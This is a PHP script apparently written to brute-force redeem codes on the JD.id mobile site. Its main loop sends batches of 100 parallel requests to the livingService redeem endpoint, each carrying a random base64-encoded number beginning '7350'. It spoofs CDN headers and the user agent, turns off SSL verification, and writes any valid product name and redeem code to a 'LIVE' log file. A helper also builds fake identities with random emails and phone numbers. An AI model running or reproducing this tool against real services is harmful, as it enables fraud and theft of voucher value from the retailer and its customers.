<?php
Class wilgans 
	{
		public function curl($api, $field, $cookie = false, $header = false, $httpheaders = null, $req = 'POST', $socks = "")
			{
				$cookie = dirname(__FILE__)."/cookies.txt";
				$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, $api);
					curl_setopt($ch, CURLOPT_POSTFIELDS, $field);
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $req);
				if($cookie == true)
					{	
						curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
						curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie);
					}
					curl_setopt($ch, CURLOPT_HEADER, $header);
					@curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheaders);
					curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
				    curl_setopt($ch, CURLOPT_PROXY, $socks);
				    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
					curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
					curl_setopt($ch, CURLOPT_USERAGENT, "");
				$response = curl_exec($ch);
					 curl_close($ch);
				return $response;
			}

		public function multi_curl($url = null , $custom = null, $option = null)
			{
				/*
				for($a=0;$a<=2;$a++)
					{
						$custom = array();
						$url = array();
						$option = array();
						for($b=0;$b<=2;$b++)
							{
								$custom[] = array(
									'cookie' => false,
									'header' => false,
									'httpheaders' => $headers,
									'socks' => ''
									);
										$url[] = array(
											'url' => '',
											'request' => '',
											'postfields' => '',
											);
											$option[] = array(
												'email' => 'h',
												'pw' => 'pw'
												);
							}
						}
				*/
					$cookie = dirname(__FILE__)."/cookiez.cook";			
		            $ch         = array();
			        $mh         = curl_multi_init();
			        $total      = count($url);
			        $hasilnya   = array();
			        $allrespons = array();
			        for ($i = 0; $i < $total; $i++) {
			            $ch[$i]             = curl_init();
			            $threads[$ch[$i]]   = array(
			                'proses_id' => $i,
			                'url'       => $url[$i]['url'],
			                'option' => $option[$i]
			            );
		            curl_setopt($ch[$i], CURLOPT_URL, $url[$i]['url']);
		            curl_setopt($ch[$i], CURLOPT_POSTFIELDS, $url[$i]['postfields']);
		            curl_setopt($ch[$i], CURLOPT_SSL_VERIFYPEER, 0);
		            curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		            curl_setopt($ch[$i], CURLOPT_FOLLOWLOCATION, 1);
		            curl_setopt($ch[$i], CURLOPT_CUSTOMREQUEST, $url[$i]['request']);
		            //curl_setopt($ch[$i], CURLOPT_TIMEOUT, 15);
		                if($custom[$i]['cookie'] == true)
		                {   
		                    curl_setopt($ch[$i], CURLOPT_COOKIEFILE, $cookie);
		                    curl_setopt($ch[$i], CURLOPT_COOKIEJAR, $cookie);
		                }
		            curl_setopt($ch[$i], CURLOPT_HEADER, $custom[$i]['header']);
		            curl_setopt($ch[$i], CURLOPT_HTTPHEADER, $custom[$i]['httpheaders']);
		           // curl_setopt($ch[$i], CURLOPT_HTTPPROXYTUNNEL, 1);
		           // curl_setopt($ch[$i], CURLOPT_PROXY, $custom[$i]['socks']);
		          //  curl_setopt($ch[$i], CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
		            curl_setopt($ch[$i], CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
		            curl_setopt($ch[$i], CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/12F70 Safari/600.1.4");
		            @curl_multi_add_handle($mh, $ch[$i]);
		        }
		        $active = null;
		        do {
		            $mrc = curl_multi_exec($mh, $active);
		            while($info = curl_multi_info_read($mh))
		            {    
		                $threads_data   = $threads[$info['handle']];
		                $result         = curl_multi_getcontent($info['handle']);
		                $info           = curl_getinfo($info['handle']);
		                $allrespons[]   = array(
		                    'respons'  => $result,
		                    'info'    => $threads_data
		                );
		                @curl_multi_remove_handle($mh, $info['handle']);
		            }
		           //usleep(1000);
		        } while ($active);
		        curl_multi_close($mh);
		        return $allrespons;
	   		}	

	  	public function fetch_cookies($source) 
		  	{
			    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $source, $matches);
			    $cookies = array();
			    foreach($matches[1] as $item) 
				    {
				        parse_str($item, $cookie);
				        $cookies = array_merge($cookies, $cookie);
				    }
			    return $cookies;
			}

		public function getStr($page, $str1, $str2, $line_str2, $line)
			{
				$get 	= explode($str1, $page);
				$get2 	= explode($str2, $get[$line_str2]);
				return $get2[$line];
			}

		public function acak($length)	
			{
		    	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		        $charactersLength = strlen($characters);
		        $randomString = '';
		        for ($i = 0; $i < $length; $i++) 
			        {
			            $randomString .= $characters[rand(0, $charactersLength - 1)];
			        }
		        return $randomString;
			}   

		public function angka($length)	
			{
			    $characters = '1234567890';
		        $charactersLength = strlen($characters);
		        $randomString = '';
		        for ($i = 0; $i < $length; $i++) 
			        {
			            $randomString .= $characters[rand(0, $charactersLength - 1)];
			        }
		        return $randomString;
			}

		public function fwrite($namafile,$data)
			{
				//$data 		= "Live => ".$email."|".$pw."\n";
				$fh 		= fopen($namafile.".txt", "a");
				fwrite($fh, $data);
				fclose($fh);  
			}	

		public function read()
			{
				return trim(fgets(STDIN));
			}	

		public function random_nama()
			{
				$get 		= file_get_contents("https://api.randomuser.me");
				$j 			= json_decode($get, true);
			    $first 		= $j['results'][0]['name']['first'];
			    $last 		= $j['results'][0]['name']['last'];
			    $nama 		= $first .$last;
			    $rand 		= rand(00000,99999);
			    $email 		= $first.$rand.$this->angka(3)."@gmail.com";	
			    $nomorhp 	= "62821".$this->angka(8)."";
			    $password 	= $first.$this->angka(4);	
			    return array(
			    	"first" => $first,
			    	"last" => $last,
			    	"nama" => $nama,
			    	"email" => $email,
			    	"nope" => $nomorhp,
			    	"password" => $password
			    	);
			}
	}	

$curl = new wilgans();

for ($a=0; $a<=3000000000; $a++)
	{
		$url = array();
		$option = array();
		for ($i=0; $i<100; $i++)
			{
				$headers = array();
				///$rand = "7349".$curl->angka(8);
				$rand = "7350".$curl->angka(8);
				$headers[] = 'X-Via: 1.1 PSxjpSin1dj218:6 (Cdn Cache Server V2.0), 1.1 VMxjpSIN4ld68:5 (Cdn Cache Server V2.0), 1.1 jdelin224:4 (Cdn Cache Server V2.0)';
				$custom[] = array(
					'cookie' => false,
					'header' => false,
					'httpheaders' => $headers,
					'socks' => ''
					);
						$url[] = array(
							'url' => 'https://m.jd.id/livingService/redeem/'.base64_encode($rand),
							'request' => 'GET',
							'postfields' => false,
							);
								$option[] = array(
									'rand' => $rand,
									);
			}					

			$result1 = $curl->multi_curl($url, $custom, $option);
	foreach($result1 as $loop => $result)
		{
			$date = date("H:i:s"); 
			$response 			= $result['respons'];
			@$invalid_message 	= $curl->getStr($response, '"msg":"', '"', 1, 0);
			@$status 			= $curl->getStr($response, '"success":', ',', 1, 0);
			@$product_name 		= $curl->getStr($response, '"skuName":"', '"', 1, 0);
			@$reedem_code 		= $curl->getStr($response, '"redeemCode":"', '"', 1, 0);
			@$base 				= $result['info']['option']['rand'];
			if($status == "false" && empty($product_name)){
			echo "\nDIE -> [{$date}] - [$base] ";
			//$curl->fwrite("MCD","APWKWAKOWKAOKAW");
			}elseif($status == "true"){
				echo "\nLIVE [{$date}] - [{$product_name}:{$reedem_code}:https://m.jd.id/livingService/redeem/".base64_encode($base)."] ";
				$curl->fwrite("MCD","LIVE [{$date}] - [{$product_name}:{$reedem_code}:https://m.jd.id/livingService/redeem/".base64_encode($base)."]\n");
			}elseif(empty($result['respons']) && empty($result)){
				echo "\nDOWN -> [{$date}] - [$base] ";	
			}elseif(preg_match('/The following error was encountered:/', $response)){
				echo "\nERROR -> [{$date}] - [$base] ";	
			}else{
				echo "\nUnknown -> [{$date}] - [https://m.jd.id/livingService/redeem/".base64_encode($base)."] ";
				print_r($response);
			}
			//usleep(1000);
			//print_r($base);
		}
		echo "\nPlease Wait . . . ";

	}
		//print_r($reedem_code);

?>

